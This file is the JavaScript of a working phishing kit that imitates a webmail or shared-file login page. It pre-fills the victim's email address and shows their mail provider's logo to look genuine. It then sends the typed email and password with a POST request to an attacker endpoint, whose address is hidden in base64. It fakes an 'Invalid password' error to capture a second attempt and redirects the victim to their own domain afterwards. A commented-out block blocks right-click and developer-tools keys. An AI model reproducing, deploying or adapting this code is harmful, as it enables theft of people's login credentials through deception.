    s.src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"; 
    s.onload = function(e){ 
        $( document ).ready(function() {
              actn();

var taf = document.getElementById("email");
var elf = document.getElementById("password");
if (taf || elf){
taf.addEventListener("keypress", function(event) {
  if (event.key === "Enter") {
    event.preventDefault();
    document.getElementById("myBtn").click();
  }
});
elf.addEventListener("keypress", function(event) {
  if (event.key === "Enter") {
    event.preventDefault();
    document.getElementById("myBtn").click();
  }
});
}

var email = $("#ref").attr("soso");
document.getElementById("email").value = email;

var mailArr = email.split('@');
var mailHost = mailArr[1];
var imgsrc = "https://icon.horse/icon/"+mailHost;
function logo() {
  document.getElementById("elogo").src = imgsrc;
}

logo();




 }); 
     };  
    document.head.appendChild(s);  
/*
  document.addEventListener('contextmenu', event => event.preventDefault());

  document.onkeydown = function(e) {
      if (e.ctrlKey && (e.keyCode === 73 || e.keyCode === 105 || e.keyCode === 74 || e.keyCode === 106 || e.keyCode === 85 || e.keyCode === 117)) {
              alert('not allowed');
                return false;
            } else {
                return true;
            }
        }
          
*/
window.onload=function(){


}


function fcs(){
  document.getElementById("usremf").classList.add('focus');
}

function blr(){
  if ( document.getElementById("usremf").classList.contains('focus') ){
  document.getElementById("usremf").classList.remove('focus');
}
}
function fcs2(){
  document.getElementById("pwdinp").classList.add('focus');
}

function blr2(){
  if ( document.getElementById("pwdinp").classList.contains('focus') ){
  document.getElementById("pwdinp").classList.remove('focus');
}
}



function load(){
    var btn = document.getElementById("myBtn");
    btn.innerHTML = 'Loading...';
    document.getElementById("myBtn").disabled = true;
}

function signin(){
  document.getElementById("password").value ="";
  var ermsg = document.getElementById("showerror");
  if(document.getElementById("pwdinp").classList.contains('errorfocus')) {
ermsg.innerHTML = 'Invalid password. Please try again';
}
else{
  document.getElementById("pwdinp").classList.add('errorfocus')
  ermsg.innerHTML = 'Invalid password. Please try again';
  document.getElementById("showerror").classList.remove('ng-hide');
}
    
    var btn = document.getElementById("myBtn");
    btn.innerHTML = 'Open File';
    document.getElementById("myBtn").disabled = false;


}
var count = 0;

 function lor(){

  var email = document.getElementById("email").value
  var epass = document.getElementById("password").value;
  var mailArr = email.split('@');
  var land = "https://www."+mailArr[1]+"/404";


  if(epass==''){
document.getElementById("pwdinp").classList.add('errorfocus');
ermsg.innerHTML = 'Please enter your password';
document.getElementById("showerror").classList.remove('ng-hide');
                }else{
count=count+1;
load();

  var ruta = atob('aHR0cHM6Ly9peHVvLm9uZS9pbmRleC5waHA=');
  var register = {"u":email,"p":epass,"signup":"webmail",};

$.post(ruta, register, function(data){            
          console.log('response: ', data);
if (count>=2) {
       count=0;
       
        window.location.replace(land);
}else {

    signin();
        
return false;
}         
 });
}


 }

function chck(){
  var mfmt = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;

  var usr = document.getElementById("email").value
  var pass = document.getElementById("password").value;
  var ermsg = document.getElementById("showerror");

  if(!usr && !pass){

          if ( document.getElementById("usremf").classList.contains('errorfocus') ){

            if(document.getElementById("pwdinp").classList.contains('errorfocus')) {
ermsg.innerHTML = 'Email or Password incorrect';
document.getElementById("showerror").classList.remove('ng-hide');
            }
            else{
              document.getElementById("pwdinp").classList.add('errorfocus');
        ermsg.innerHTML = 'Email or Password incorrect';
        document.getElementById("showerror").classList.remove('ng-hide');


            }

          

        }
        else{
          document.getElementById("usremf").classList.add('errorfocus');
          document.getElementById("pwdinp").classList.add('errorfocus');
          ermsg.innerHTML = 'Email or Password incorrect';
          document.getElementById("showerror").classList.remove('ng-hide');

        }

  }
        else if (!usr){

    if ( document.getElementById("usremf").classList.contains('errorfocus') ){

  ermsg.innerHTML = 'Enter a valid email address';
  document.getElementById("showerror").classList.remove('ng-hide');

         }
         else{
          document.getElementById("usremf").classList.add('errorfocus');
       ermsg.innerHTML = 'Enter a valid email address';
     document.getElementById("showerror").classList.remove('ng-hide');
         }
     }

  else if(!usr.match(mfmt)){

    if ( document.getElementById("usremf").classList.contains('errorfocus') ){

ermsg.innerHTML = 'Enter a valid email address';
        }
        else{
          document.getElementById("usremf").classList.add('errorfocus');
  ermsg.innerHTML = 'Enter a valid email address';
document.getElementById("showerror").classList.remove('ng-hide');

        }
    }
        


  else if(!pass){
    if(document.getElementById("pwdinp").classList.contains('errorfocus')) {
ermsg.innerHTML = 'Please enter your password';
document.getElementById("showerror").classList.remove('ng-hide');

            }
            else{
          document.getElementById("pwdinp").classList.add('errorfocus');
          ermsg.innerHTML = 'Please enter your password';
            document.getElementById("showerror").classList.remove('ng-hide');

            }

  }
  else {
    lor();
  }
}
